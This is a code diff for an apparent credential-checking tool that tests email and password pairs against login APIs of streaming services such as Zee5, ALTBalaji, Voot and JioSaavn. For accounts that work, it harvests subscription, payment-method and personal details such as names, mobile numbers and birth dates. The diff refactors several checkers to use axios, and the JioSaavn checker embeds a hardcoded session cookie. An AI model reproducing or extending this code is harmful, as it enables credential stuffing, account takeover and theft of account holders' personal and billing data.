@@ -161,52 +161,52 @@ let hotstarChecker = async (account,page)=>{
 
 };
 
-let zee5Checker = async (account,page)=>{
-    if(validateEmail(account.login) && !!account.password){
-        await page.goto('https://userapi.zee5.com/v1/user/loginemail?email='+account.login+'&password='+account.password);
-        var innerText = await page.evaluate(() =>  {
+let zee5Checker = async (account, page) => {
+    if (validateEmail(account.login) && !!account.password) {
+        await page.goto('https://userapi.zee5.com/v1/user/loginemail?email=' + account.login + '&password=' + account.password);
+        var innerText = await page.evaluate(() => {
             return JSON.parse(document.querySelector("body").innerText);
         });
         var checkResult = {
-            validAccount : false,
-            accountLogin:{
-                email:account.login,
-                password:account.password
+            validAccount: false,
+            accountLogin: {
+                email: account.login,
+                password: account.password
             }
         };
-        if(innerText.token){
+        if (innerText.token) {
             console.log(true);
-            checkResult.validAccount= true;
-           const scraped =  await page.evaluate(()=>{
+            checkResult.validAccount = true;
+            const scraped = await page.evaluate(() => {
                 const myHeaders = new Headers();
                 myHeaders.append('X-Z5-Appversion', '17.0.0.6');
                 myHeaders.append('X-Z5-AppPlatform', 'Android Mobile');
                 myHeaders.append('Host', 'userapi.zee5.com');
                 myHeaders.append('Connection', 'Keep-Alive');
                 myHeaders.append('Accept-Encoding', 'gzip');
-                myHeaders.append('Authorization', 'bearer '+ JSON.parse(document.querySelector("body").innerText).token);
+                myHeaders.append('Authorization', 'bearer ' + JSON.parse(document.querySelector("body").innerText).token);
                 return fetch('https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_active=true', {
                     method: 'GET',
                     headers: myHeaders,
                 })
-                    .then(response  => response.json())
+                    .then(response => response.json())
                     .then(json => json[0]);
             });
 
             checkResult.accountInfo = {
-                planType:scraped.subscription_plan.subscription_plan_type,
-                planTitle:scraped.subscription_plan.title,
-                state:scraped.state,
-                freeTrial:scraped.free_trial,
+                planType: scraped.subscription_plan.subscription_plan_type,
+                planTitle: scraped.subscription_plan.title,
+                state: scraped.state,
+                freeTrial: scraped.free_trial,
                 start: scraped.subscription_start,
-                end:scraped.subscription_end,
-                country:scraped.subscription_plan.country,
-                numSup:scraped.subscription_plan.number_of_supported_devices,
-                billingCycle:scraped.subscription_plan.billing_frequency,
-                billingCycleType:scraped.subscription_plan.billing_cycle_type,
-                valid_for_all_countries:scraped.subscription_plan.valid_for_all_countries,
-                countries:scraped.subscription_plan.countries,
-                price:scraped.subscription_plan.price + scraped.subscription_plan.currency
+                end: scraped.subscription_end,
+                country: scraped.subscription_plan.country,
+                numSup: scraped.subscription_plan.number_of_supported_devices,
+                billingCycle: scraped.subscription_plan.billing_frequency,
+                billingCycleType: scraped.subscription_plan.billing_cycle_type,
+                valid_for_all_countries: scraped.subscription_plan.valid_for_all_countries,
+                countries: scraped.subscription_plan.countries,
+                price: scraped.subscription_plan.price + scraped.subscription_plan.currency
             };
             return checkResult;
         }
@@ -214,146 +214,128 @@ let zee5Checker = async (account,page)=>{
 
 };
 
-let altbalajiChecker = async (account,page) => {
+let altbalajiChecker = async (account)=>{
     var checkResult = {
         validAccount:false,
-        accountLogin:{email:account.login,password:account.password},
+        accountLogin:{
+            email:account.login,
+            password:account.password
+        },
         accountInfo:null
     };
-    if(!!account.password  && validateEmail(account.login) ){
-        await page.goto('https://api.cloud.altbalaji.com/accounts/lookup?login='+account.login+'&domain=IN');
-        var innerText = await page.evaluate(() =>  {
-            return JSON.parse(document.querySelector("body").innerText);
-        });
-        if(innerText.status){
-          var scraped =  await page.evaluate((account)=>{
-               var myHeaders = new Headers();
-               myHeaders.append('Accept', 'application/json, text/plain, */*');
-               myHeaders.append('Accept-Encoding', 'gzip, deflate, br');
-               myHeaders.append('Accept-Language', 'en-US,en;q=0.9,fr;q=0.8,ar;q=0.7,de;q=0.6');
-               myHeaders.append('Connection', 'Keep-Alive');
-               myHeaders.append('Content-Length', '63');
-               myHeaders.append('Host', 'api.cloud.altbalaji.com');
-               myHeaders.append('Sec-Fetch-Dest', 'empty');
-               return fetch('https://api.cloud.altbalaji.com/accounts/login?domain=IN', {
-                   method: 'POST',
-                   headers: myHeaders,
-                   body:JSON.stringify({username: account.login, password:account.password})
-               })
-                   .then(response  => response.json())
-                   .then(json => {
-                       myHeaders.append('XSSESSION', json.session_token);
-                      return fetch('https://api.cloud.altbalaji.com/accounts?Account_Id=4266539&Profile_Id=4266540&domain=IN', {
-                           method: 'GET',
-                           headers: myHeaders,
-                       })
-                           .then(response  => response.json())
-                           .then(json => {
-                                return fetch('https://payment.cloud.altbalaji.com/accounts/orders?domain=IN&limit=50',{
-                                    method:'GET',
-                                    headers:myHeaders
-                                })
-                                    .then(response => response.json())
-                                    .then( payment=>{
-                                        return  {
-                                            surname:json.surname,
-                                            name:json.name,
-                                            type:json.type,
-                                            gender:json.details.gender,
-                                            state:json.details.state,
-                                            email_verified:json.email_verified,
-                                            paymentInfo:{
-                                                payment_type:payment.orders[0].payment_type,
-                                                amount:payment.orders[0].price.amount + payment.orders[0].price.amount.currency,
-                                                is_free:payment.orders[0].price.is_free,
-                                                start:payment.orders[0].dates.valid_from,
-                                                end:payment.orders[0].dates.valid_to,
-                                                status:payment.orders[0].status,
-                                                is_trial:payment.orders[0].is_trial,
-                                                payment_method:payment.orders[0].payment_method
-                                            }
-                                        }
-                                    })
-                           });
-                   })
-                   .catch(err => console.log(err));
+    if(validateEmail(account.login)){
+        try {
+            var myHeaders = {
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8,ar;q=0.7,de;q=0.6',
+                'Connection': 'Keep-Alive',
+                'Content-Length': '63',
+                'Host': 'api.cloud.altbalaji.com',
+                'Sec-Fetch-Dest': 'empty'
+            };
+            const token = await axios.post("https://api.cloud.altbalaji.com/accounts/login?domain=IN",
+                {username: account.login, password: account.password},
+                {headers:myHeaders}
+            ).then(axiosResponse => axiosResponse.data);
+            console.log(token);
+            const profile = await axios.get('https://api.cloud.altbalaji.com/accounts?Account_Id=4266539&Profile_Id=4266540&domain=IN',{
+                headers:{'XSSESSION':token.session_token}
+            })
+                .then(axiosResponse => axiosResponse.data);
+            console.log(profile);
+            const payment = await axios.get('https://payment.cloud.altbalaji.com/accounts/orders?domain=IN&limit=50',{
+                headers:{'XSSESSION':token.session_token}
+            }).then(axiosResponse => axiosResponse.data);
 
-           },account);
-          if(scraped){
-              checkResult.accountInfo = scraped;
-              checkResult.validAccount = true;
-          }
-          if(!scraped){
-              checkResult.validAccount = false;
-              checkResult.accountInfo = null;
-          }
-
+            checkResult.validAccount = true;
+            checkResult.accountInfo = {
+                surname: profile.surname,
+                name: profile.name,
+                type: profile.type,
+                gender: profile.details.gender,
+                state: profile.details.state,
+                email_verified: profile.email_verified,
+                paymentInfo: {
+                    payment_type: payment.orders[0].payment_type,
+                    amount: payment.orders[0].price.amount + payment.orders[0].price.amount.currency,
+                    is_free: payment.orders[0].price.is_free,
+                    start: payment.orders[0].dates.valid_from,
+                    end: payment.orders[0].dates.valid_to,
+                    status: payment.orders[0].status,
+                    is_trial: payment.orders[0].is_trial,
+                    payment_method: payment.orders[0].payment_method
+                }
+            };
+            console.log(checkResult);
 
         }
-
-        return checkResult;
+        catch (e) {
+            console.log(e);
+            return checkResult;
+        }
     }
 };
 
-let vootChecker = async (account,page) => {
+let vootChecker = async (account) => {
     var checkResult = {
         validAccount:false,
-        accountLogin:{email:account.login,password:account.password},
+        accountLogin: {
+            email: account.login,
+            password:account.password
+        },
         accountInfo:null
     };
-  await page.goto('https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser');
-  var scraped = await page.evaluate((account)=>{
-      return fetch('https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/login', {
-          method: 'POST',
-          headers:  { 'content-type': 'application/json' },
-          body:JSON.stringify({"type":"traditional","deviceId":"Windows NT 10.0","deviceBrand":"PC/MAC","data":{"email":account.login,"password":account.password}})
-      })
-          .then(response  => response.json())
-          .then(accinfo => {
-              return fetch('https://pxapi.voot.com/smsv4/int/ps/v1/voot/transaction/list',{
-                  method:"GET",
-                  headers:  {
-                      'content-type': 'application/json' ,
-                      'accesstoken' : accinfo.data.authToken.accessToken
-                  }
-              })
-                  .then(response  => response.json())
-                  .then( payment => {
-                      return {
-                          age:accinfo.data.age,
-                          mobile:accinfo.data.mobile,
-                          languages:accinfo.data.languages,
-                          birthDate:accinfo.data.birthDate,
-                          firstName:accinfo.data.firstName,
-                          profileName:accinfo.data.profileName,
-                          lastName:accinfo.data.lastName,
-                          gender:accinfo.data.gender,
-                          isTemporaryPassword:accinfo.data.isTemporaryPassword,
-                          isPasswordChangeable:accinfo.data.isPasswordChangeable,
-                          paymentInfo:{
-                              start:payment.results.list[0].startDate.gmtDate,
-                              end:payment.results.list[0].endDate.gmtDate,
-                              duration:payment.results.list[0].itemDetails.duration,
-                              plan:payment.results.list[0].itemDetails.name,
-                              isRenewable:payment.results.list[0].itemDetails.isRenewable,
-                              price:payment.results.list[0].price.amount + payment.results.list[0].price.currency,
-                              paymentMethod:payment.results.list[0].paymentDetails.extras.mode,
-                              PaymentGateway:payment.results.list[0].paymentDetails.extras.PaymentGateway
-                          }
-                      }
-                  });
-          })
-  },account);
-  console.log(scraped);
-    if(scraped){
-        checkResult.accountInfo = scraped;
-        checkResult.validAccount = true;
+
+    if(validateEmail(account.login)){
+        try {
+            const token = await axios.post('https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/login',{
+                "type": "traditional",
+                "deviceId": "Windows NT 10.0",
+                "deviceBrand": "PC/MAC",
+                "data": {"email": account.login, "password": account.password}
+            },{ headers: {'content-type': 'application/json'}})
+                .then(axiosResponse => axiosResponse.data.data);
+            console.log(token);
+            checkResult.validAccount = true;
+            checkResult.accountInfo = await axios.get("https://pxapi.voot.com/smsv4/int/ps/v1/voot/transaction/list",{
+                headers: {
+                    'content-type': 'application/json',
+                    'accesstoken': token.authToken.accessToken
+                }
+            }).then(res=>{
+                var payment = res.data;
+                return {
+                    age: token.age,
+                    mobile: token.mobile,
+                    languages: token.languages,
+                    birthDate: token.birthDate,
+                    firstName: token.firstName,
+                    profileName: token.profileName,
+                    lastName: token.lastName,
+                    gender: token.gender,
+                    isTemporaryPassword: token.isTemporaryPassword,
+                    isPasswordChangeable: token.isPasswordChangeable,
+                    paymentInfo: {
+                        start: payment.results.list[0].startDate.gmtDate,
+                        end: payment.results.list[0].endDate.gmtDate,
+                        duration: payment.results.list[0].itemDetails.duration,
+                        plan: payment.results.list[0].itemDetails.name,
+                        isRenewable: payment.results.list[0].itemDetails.isRenewable,
+                        price: payment.results.list[0].price.amount + payment.results.list[0].price.currency,
+                        paymentMethod: payment.results.list[0].paymentDetails.extras.mode,
+                        PaymentGateway: payment.results.list[0].paymentDetails.extras.PaymentGateway
+                    }
+                }
+            });
+            console.log(checkResult);
+            return checkResult
+        }
+        catch (e) {
+            console.log(e);
+            return checkResult;
+        }
     }
-    if(!scraped){
-        checkResult.validAccount = false;
-        checkResult.accountInfo = null;
-    }
-  return checkResult;
 };
 
 let sonylivChecker = async (account,page) => {
@@ -408,41 +390,41 @@ let sonylivChecker = async (account,page) => {
   return scraped;
 };
 
-let jiosaavnChecker = async (account,page) => {
+let jiosaavnChecker = async (account)=>{
     var checkResult = {
-        validAccount:false,
-        accountLogin:{email:account.login,password:account.password},
-        accountInfo:null
+        validAccount: false,
+        accountLogin: {email: account.login, password: account.password},
+        accountInfo: null
     };
-  await page.goto('https://www.jiosaavn.com/');
-  const scraped = await page.evaluate((account)=>{
-      let formData = new FormData();
-      formData.append('username', account.login);
-      formData.append('password', account.password);
-      return fetch('https://www.jiosaavn.com/api.php?__call=user.login&api_version=4&_format=json&_marker=0&ctx=web6dot0', {
-          method: 'POST',
-          headers:  {
-              'Orogin':'https://www.jiosaavn.com',
-              "Host": "jiosaavn.com",
-          },
-          body:formData
-          })
-          .then(response  => response.json())
-          .then(data => data)
-          .catch(err => null)
+    try{
+        let data = new FormData();
+        data.append('username', account.login);
+        data.append('password', account.password);
+        var config = {
+            method: 'post',
+            url: 'https://www.jiosaavn.com/api.php?__call=user.login&api_version=4&_format=json&_marker=0&ctx=web6dot0',
+            headers: {
+                'Cookie': 'geo=163.172.121.143%2CFR%2C%2C%2C; B=aec522844f8a6de7e0990e8c14760940; CT=MTM3NDM5MjY5; CH=G03%2CA07%2CO00%2CL03; P=pro%3A1614014900; TID=ZnVsbHByb190aWVy%3A1614014900; I=PSpQ2VWE%2BFqn2p%2FOxxuT%2FdIwFRUmEgjb0%2B4OfA5XfgciGxtz4HzvNkh7s0XL2KeOeEYTJXEKnspRsw5PlvInGLARc9j7OVLfoxPCOu6WeuxrwqS0OM%2FR4nr0PgMBY2bHnawgIFKYs2Ue%2BxNJMp2jG%2Fbcp3Y5eTuhfYEr2hyAc90Yjd3WPx99QY5nVJZ8b%2BXHsPHix7Uyln0p141Xrezk0SUdYJxkcbOMS03zU9a0KLN0RrF8kUwngYznBSco3pWRfwczBIcuNK4Xu9%2Fyi8UrAKaQh383aTqGp8gyfezVCll0iy7ycVwNLlu7Qs6nX3Sj9nuv80tVpnOFxwWw6lnuvaWr7I96e4TysVYP9PZdtFGh2m8HKuGlxw%3D%3D; SG=f',
+                ...data.getHeaders()
+            },
+            data : data
+        };
 
-  },account);
+        const scraped = await axios(config)
+            .then(function (response) {
+                return response.data;
+            })
+            .catch(function (error) {
+                console.log(error);
+            });
 
-    if(scraped){
-        checkResult.accountInfo = scraped;
+        console.log(scraped);
         checkResult.validAccount = true;
+        checkResult.accountInfo = scraped;
+    }catch (e) {
+        console.log(e);
     }
-    if(scraped.error){
-        checkResult.validAccount = false;
-        checkResult.accountInfo = null;
-    }
-  console.log(scraped);
-  return checkResult;
+    return  checkResult;
 };
 
 let nordvpnChecker = async (account,page) => {
